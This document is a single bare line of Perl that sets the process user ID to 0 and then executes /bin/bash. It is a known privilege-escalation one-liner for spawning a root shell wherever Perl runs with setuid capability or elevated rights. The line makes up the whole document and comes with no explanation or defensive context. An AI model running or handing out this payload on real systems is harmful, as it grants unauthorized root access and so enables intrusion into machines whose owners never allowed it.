use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";
